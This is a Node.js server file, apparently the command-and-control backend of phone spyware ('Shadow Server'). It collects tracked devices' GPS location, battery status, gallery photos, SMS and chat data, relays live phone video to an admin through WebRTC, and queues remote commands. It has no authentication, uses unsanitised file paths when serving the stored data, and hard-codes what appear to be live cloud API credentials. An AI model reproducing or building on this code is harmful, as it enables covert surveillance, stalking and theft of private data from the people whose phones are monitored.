const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); // 🔥 Added for WebRTC
const { Server } = require("socket.io"); // 🔥 Added for WebRTC

const app = express();
const server = http.createServer(app); // HTTP server context
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;

// --- 1. CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {}; 

// ==================================================
// 🔥 WebRTC SIGNALING & SOCKET LOGIC
// ==================================================
io.on("connection", (socket) => {
    console.log("⚡ New Connection:", socket.id);

    // Join Room (Phone and Admin both join using Device ID)
    socket.on("join", (deviceId) => {
        const id = deviceId.toUpperCase().trim();
        socket.join(id);
        console.log(`📡 Room Joined: ${id}`);
    });

    // 1. Offer forward करना (Phone -> Admin)
    socket.on("offer", (data) => {
        const id = data.room.toUpperCase().trim();
        socket.to(id).emit("offer", data);
        console.log(`📞 Video Offer sent to Room: ${id}`);
    });

    // 2. Answer forward करना (Admin -> Phone)
    socket.on("answer", (data) => {
        const id = data.room.toUpperCase().trim();
        socket.to(id).emit("answer", data);
        console.log(`✅ Video Answer sent to Room: ${id}`);
    });

    // 3. ICE Candidates forward करना
    socket.on("candidate", (data) => {
        const id = data.room.toUpperCase().trim();
        socket.to(id).emit("candidate", data);
    });

    socket.on("disconnect", () => {
        console.log("❌ Socket Disconnected");
    });
});

// --- 3. ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Shadow Server: HD Gallery & WebRTC Live Stream Ready!');
});

// ==================================================
//  GALLERY SYSTEM (HD PHOTOS)
// ==================================================

app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data Received" });

    const id = device_id.toString().trim().toUpperCase();
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, { 
        folder: id, public_id: Date.now().toString(), resource_type: "image",
        width: 1280, quality: "auto", fetch_format: "auto"
    }, function(error, result) {
        if (error) return res.status(500).json({ error: "Upload Failed" });
        console.log(`📸 [GALLERY] Saved for ${id}`);
        res.json({ status: "success", url: result.secure_url });
    });
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    cloudinary.api.resources({
        type: 'upload', prefix: id + "/", max_results: 20, direction: 'desc'
    }, function(error, result) {
        if (error) return res.json({ photos: [], next_cursor: null });
        res.json({ photos: result.resources.map(img => img.secure_url), next_cursor: result.next_cursor });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS
// ==================================================

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = devicesStatus[id]?.command || "none";
        if(pendingCommand !== "none") devicesStatus[id].command = "none";

        devicesStatus[id] = {
            ...devicesStatus[id], id,
            model: model || "Unknown",
            battery: battery || level || 0,
            charging: (String(charging) === "true"),
            lat: lat || 0, lon: lon || 0,
            lastSeen: Date.now()
        };
        res.json({ status: "success", command: pendingCommand });
    } catch (e) { res.status(500).json({ error: "Server Error" }); }
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id, lastSeen: 0 };
    devicesStatus[id].command = command;
    res.json({ status: "success", command });
});

// ==================================================
//  🔥 DATA STORAGE (CHATS, SMS, ETC.)
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let existingData = [];
        if (fs.existsSync(filePath)) {
            try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        
        let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
        let finalData = (type === 'location') ? parsedData : [...newDataArray, ...existingData].slice(0, 5000);
        
        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ status: "error" }); }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// 🔥 Use server.listen instead of app.listen for Sockets
server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
